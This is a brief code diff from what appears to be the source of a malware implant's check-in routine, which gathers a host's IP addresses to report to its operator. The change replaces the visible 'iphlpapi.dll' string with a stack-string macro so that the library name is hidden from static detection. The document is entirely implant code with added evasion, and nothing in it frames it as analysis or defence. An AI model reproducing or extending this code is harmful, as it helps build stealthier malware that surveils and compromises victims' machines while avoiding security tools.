@@ -2,6 +2,7 @@
 #include <checkin.h>
 #include <package.h>
 #include <strings.h>
+#include <stackstr.h>
 
 using namespace stardust;
 using namespace starburst;
@@ -50,8 +51,8 @@ auto declfn starburst::build_checkin_package(
 
     // IPs - collect real addresses via GetAdaptersInfo
     {
-        auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
-            symbol<LPCSTR>( "iphlpapi.dll" ) ) );
+        STK_IPHLPAPI(_n);
+        auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
 
         uint32_t ip_count = 0;
         char ip_list[16][16];
